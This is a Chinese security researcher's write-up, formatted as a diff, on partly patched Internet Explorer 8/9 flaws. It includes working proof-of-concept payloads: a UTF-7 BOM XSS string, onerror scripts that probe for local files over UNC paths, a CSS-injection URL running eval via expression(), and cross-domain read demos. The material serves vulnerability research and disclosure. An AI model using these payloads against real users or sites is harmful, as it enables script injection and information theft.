@@ -1,0 +1,271 @@
+关于IE的那些鸡肋
+
+by SuperHei_at_www.80vul.com
+
+
+   MS的补丁风格一直都是“缝缝补补”的，从来不“斩尽杀绝”，这个也造就了，很多的
+IE漏洞逐步实现“鸡屁股”-->“鸡肋”-->“鸡骨头”的神奇历程！本文就以这个过程来对
+一些具体IE漏洞的进行简单跟踪，及目前的状态作一些总结：
+
+[注：就MS打算抛弃IE6/7等低版本的IE，另外IE10还是测试开发阶段，所以本文测试是在
+IE8和IE9上]
+
+一、mhtml的故事
+
+“MHTML vulnerability”无疑是去年最大的亮点，在2011年1月的Ph4nt0m Webzine 0x05上
+由d4rkwind《IE下MHTML协议带来的跨域危害》一文拉开序幕，在Ph4nt0m Webzine 0x05发布
+的同时，我在FD上发布了通过学习《IE下MHTML协议带来的跨域危害》后写的关于mhtml利用
+的文章《Hacking with mhtml protocol handler》，紧接着MS发布了漏洞公告及临时处理办
+法：Microsoft Security Advisory (2501696)，一直没有推出正式的补丁直到2011年4月的
+MS11-026，但是故事还在继续...。MS11-26没有处理好<embed>标签调用mhtml带来的安全问
+题，只到2011年6月的MS11-037被补丁。似乎一切都很完美了，不过很遗憾的是悲剧还在延续。
+
+我在2011年8月测试发现安装MS11-057补丁后在某些系统（MS证实XP和Server 2003）上
+MHTML vulnerability再次出现，这个问题于9月发布在FD上《MHTML Mime-Formatted 
+Request Vulnerability Again》而这个问题最终在12月的补丁了补丁（具体不详:(）
+
+目前看来mhtml完全变为了没有肉丝的鸡骨头了。
+
+二、utf7 BOM
+
+这个是去年IE猥琐流问题里的又一亮点，这个延续了mhtml导致的"100+个xss"的传奇。这个
+问题起源于Gareth Heyes于2010年写的《XSS Lightsabre techniques》一文里，在2011年在
+和Mario Heiderich一次交流中得知这个utf7 dom的问题，我们先回顾一下基础知识"什么是BOM?":
+
+BOM（byte-order mark），即字节顺序标记，它是插入到以UTF-8、UTF16或UTF-32编码
+Unicode文件开头的特殊标记，用来识别Unicode文件的编码类型。
+
+对于utf7来说BOM字符为：“+/v8、 +/v9、 +/v+、 +/v/”，因为BOM字符要求位于文件开
+头，所以它的优先等级应该在html文件设置charset的前面如<meta>。但是在一些浏览器如
+IE在处理BOM时，它的优先等级先于HTTP Content-Type header，由于UTF-7编码的特殊性，
+导致通过注射BOM来控制编码，从而利用utf7编码来绕过一些安全过滤。主要表现在xss过滤
+绕过上。具体详见：《about utf7-BOM string injection》一文。
+
+对于这个问题MS好像一直都没有公开谈论过，于是d4rkwind在2011年8月的一天再次测试是发
+现MS做了一定的“fix”：HTTP Content-Type header里的charset优先于BOM！如下代码：
+
+<?php
+header('Content-Type:text/html;charset=utf-8');
+?>
++/v8/ +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+当用IE8、IE9访问以上代码时，编码为utf8而不是utf7，所以上面的js代码没有执行。但是
+我们测试发现在IE8下当我们转换编码或浏览器窗口前进后退动作到这个页面时，我们的js将
+被执行，也就是编码转为utf7，那么我们用代码实现一下：
+
+<script>
+function bom() {
+  w = open('http://192.168.1.100/ie/utf7/bom.php','_blank');
+  setTimeout(back, 300);
+}
+
+function back() {
+  w.location.href = 'http://192.168.1.100/ie/utf7/back.htm';
+}
+</script>
+<input type=submit value="go" onclick="bom()">
+
+
+http://192.168.1.100/ie/utf7/back.htm代码如下：
+
+<script>
+setTimeout('history.back()',100);
+</script>
+
+另外我们也可以这样实现：
+
+<meta http-equiv="refresh" content="2;URL=http://192.168.1.100/ie/utf7/back.htm"/> 
+<iframe src="http://192.168.1.100/ie/utf7/bom.php"></iframe>
+
+这个方法在IE9下不行。
+
+  
+另外对于使用style、link标签引用风格文件及HTTP Content-Type header没有指定
+charset的情况下，IE8、9仍然用BOM优先。
+
+三、file://+UNC
+
+同样是在2011年1月的Ph4nt0m Webzine 0x05上有我写的一篇文章《走向本地的邪恶之路》里
+面就是通过iframe通过file://+UNC调用本地xss来实现读取本地文件。也就是说在当时的环
+境iframe使用file://+UNC是合法的。即使Ph4nt0m Webzine 0x05发布后，MS一直也没有对应
+的防御措施，只到MS11-057，而这个补丁推出主要是处理“cookiejacking”的问题。一切来
+得那么意外！但是MS的补丁风格从来都不是“斩尽杀绝”的！除了iframe外其他的标签还是
+通过file://+UNC加载本地文件的,如：
+
+<img src="file:////127.0.0.1/c$/ie9.PNG" ></img>
+<script src="file:////127.0.0.1/c$/ie.js" ></script>
+
+在wooyun上曾经发布一个利用<script>调用本地文件，然后通过错误来判断的本地文件存在
+与否的公告。那么我继续测试一下：
+
+a.htm
+<script>
+window.onerror=function(){
+alert('文件存在');
+return true;
+}
+</script>
+<script src ="file:////127.0.0.1\c$\windows\system32\cmd.exe"></script>
+
+b.htm
+<script>
+window.onerror=function(){
+alert('文件存在');
+return true;
+}
+</script>
+<script src ="file:////127.0.0.1\c$\windows\system32\aaa.exe"></script>
+
+访问a.htm时会提示文件存在，访问b.htm则不会弹筐。一个完美的信息泄漏的漏洞！:)
+
+另外对于第三方的浏览器来说我们仍然可以利用iframe通过file://+UNC调用本地html文件，
+也就是说“走向本地的邪恶之路”在IE的第3方浏览器里还可以使用，当然在IE8、9里“信任
+站点”也是可以使用的。
+
+
+四、css注射跨域
+
+早在2009年大牛Chris Evans在他的blog里《Generic cross-browser cross-domain theft》
+就通过插入css字符来达到跨域读取敏感信息的目的，但是当时并没有提出"CSS String 
+Injection"这个概念只到paper《Protecting Browsers from Cross-Origin CSS Attacks》
+的发布。当时各大浏览器都基本没有限制加载css文件的Content-Type，及DOM对
+document.styleSheets读取域的限制，所以基本都受到影响。我当时在测试的时候意外发现
+了ie8的一个新的漏洞：《IE8 Css Cross-Domain Information Disclosure 
+Vulnerability》IE8允许DOM通过document.styleSheets(0).imports(0).cssText读取远程的
+文件。这些问题一起MS-071得到补丁，当然MS的补丁都会给你留下一丝希望，不会“赶尽杀
+绝”的 :)。MS-071的补丁限制了在加载第3方css文件时的Content-Type，也就是说你如果使
+用<LINK REL="stylesheet">或<style> @import url("");</style>加载远程的css时，不让
+加载html等非css文件。
+
+上面分析得到MS-071后的结果：
+
+1、对于远程文件来说，可以控制加载页面的Content-Type，那么我们还可以实现跨域读取。
+2、对于同一域来说，没有任何限制。
+
+对于1来说我们可以看看以下demo：
+
+<html>
+<head>
+<style>
+@import url("http://www.80vul.com/css.php?c=text/css");
+</style>
+<script>
+function loaded() {
+  alert(document.styleSheets(0).imports(0).cssText);
+}
+</script>
+</head>
+<body onload="loaded()">
+</body>
+</html>
+
+css.php
+<?php
+//header("Content-Type: text/css");
+header("Content-type: ".$_GET['c']);
+?>
+body {
+font-family:
+'x';
+}
+
+当然对于header("Content-type: ".$_GET['c']);这样的代码是比较“理想”的情况，在现
+实攻击里我们可以通过“HTTP Response Splitting”来实现控制Content-Type的目的。
+
+对于第2种情况，很多人包括MS官方都不认为有什么可利用的，因为它的前提就是同域，不存
+在跨域的概念。但是万事都有例外，我们看下如下代码：
+
+//demovul.php
+<LINK REL="stylesheet" HREF="./<?=$_GET['css']?>">
+
+可以通过提交demovul.php?css=aa.css来任意调用css，那么因为这个本事就是在同一个域，
+所以我们只要找到一个可以注射css字符的点，然后提交个demovul.php?css=就可以实现插入
+任意的css语句了，比如在ie下可以使用expression()来实现xss，如：
+
+http://192.168.12.102/ie/demovul.php?css=cssinj.php?a='}body{font-family:'x';xss:expression((window.rrr==1)?'':eval('rrr=1;eval(alert(111));'));font-family:'';{'
+
+
+五、本地跨域
+
+对于打开本地HTML文件是，IE一直都是“严防死守”的，比如IE打开本地文件html文件时，
+如果有js会提示并要用户允许后才可以执行。而悲剧的是这些都只是基于IE这个“外壳”上
+的防御，但更加多的第3方基于IE“内核”[Trident]的浏览器，是没有提示的。另外
+Trident在本地执行WSH是有安全提示的，但是在请求http域时没有任何防御，如下代码：
+
+<script> 
+var request = false;
+        if(window.XMLHttpRequest) {
+            request = new XMLHttpRequest();
+            if(request.overrideMimeType) {
+                request.overrideMimeType('text/xml');
+            }
+        } else if(window.ActiveXObject) {
+            var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 
+            'Microsoft.XMLHTTP', 
+            'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 
+            'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
+            for(var i=0; i<versions.length; i++) {
+                try {
+                    request = new ActiveXObject(versions[i]);
+                } catch(e) {}
+            }
+        }
+        
+xmlhttp=request;
+ 
+xmlhttp.open("GET", "http://www.80vul.com/", false);
+xmlhttp.send(null);
+var ret = xmlhttp.responseText;
+ 
+alert(ret);
+</script>
+
+在本期文章《Android应用安全之开发环境带来的危险》就利用了Eclipse自带浏览器的本地
+跨任意http域的问题。
+
+六、window.onerror跨域信息泄漏漏洞
+
+这个是一个名副其实的“鸡肋”漏洞，这个问题是Chris Evans大牛在blog:《Minor leak, 
+major headache》里提到的，到目前为止，这个鸡肋还可以正常工作 :),测试代码如下：
+
+<html>
+<body>
+<script>
+window.onerror = function(msg, url, line) {
+    if (onerror.num++ < onerror.max) {
+        alert("ERROR: " + msg + "\n" + url + ":" + line);
+        return true;
+    }
+}
+onerror.max = 3;
+onerror.num = 0;
+</script>
+<script src="http://www.80vul.com/test/error.txt">
+</script>
+</body>
+</html>
+
+七、被忽视的Content-Type
+
+在HIT2011上Yosuke HASEGAWA在《Make A Contract with IE and Become a XSS Girl!》的
+演讲里，提到了IE在处理没有在注册表里注册过的Content-Type类型时，会根据请求的URL里
+的文件后缀来判断。如下：
+
+http://www.taobao.com/expressway/index.php?id=mytaobao&container=test
+
+当我们使用IE8访问上面url是会提示下载，而访问下面url时，会解析html。
+
+http://www.taobao.com/expressway/index.php/x.html?id=mytaobao&container=test
+
+可惜这个方法不适用于IE9。
+
+后话及参考：
+
+从上面的漏洞来看，IE9在一些猥琐流安全上有了比较大的进步，但是还是遗留了一些
+“鸡肋”，而在一定的场景下，也完全有可能变为“鸡屁股”！看来MS的安全部门的人员都
+是上帝的信徒！
+至于本文里提到的那些文档，这里就没有给出具体的参考链接了，有需求的可以自己搜索或
+者在我的blog：http://hi.baidu.com/hi_heige/上寻找。本文很多都是基于记忆来总结的，
+如有不妥当或者错误的地方请一定告知，谢谢各位看官及文章里提及的那些文档的作者们！
+
+-EOF-
